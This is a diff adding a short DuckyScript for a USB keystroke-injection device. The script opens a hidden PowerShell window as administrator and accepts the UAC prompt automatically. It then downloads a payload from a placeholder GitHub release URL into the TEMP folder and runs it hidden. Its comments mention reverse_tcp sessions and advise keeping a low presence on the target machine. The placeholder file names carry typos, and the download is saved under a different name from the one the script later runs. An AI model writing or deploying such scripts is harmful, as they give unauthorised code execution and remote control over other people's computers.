@@ -1,0 +1,29 @@
+REM Open the Run dialog
+GUI r
+DELAY 400
+
+REM Type "powershell" and run as administrator
+STRING powershell -w h -NoP -NonI
+CTRL-SHIFT ENTER
+DELAY 400
+
+REM Wait for the UAC prompt and automatically press ALT + Y
+DELAY 350
+ALT y
+DELAY 200
+
+REM Download the file
+STRING Start-BitsTransfer -Source "https://github.com/USER/REPO/releases/latest/download/PAYLOED.EXTENTION" -Destination "$env:TEMP\PAYLOAD.EXTENTION"
+ENTER
+DELAY 200
+REM Run the payload
+STRING Start-Process -FilePath "$env:TEMP\PAYLOAD.EXTENTION" -WindowStyle Hidden
+ENTER
+DELAY 100
+
+REM Exit PowerShell
+STRING exit
+ENTER
+
+REM If it's a reverse_tcp connection make sure to clean the temp folder when you're done for security purposes
+REM PAY ATTENTION to your PRESENCE on the machine
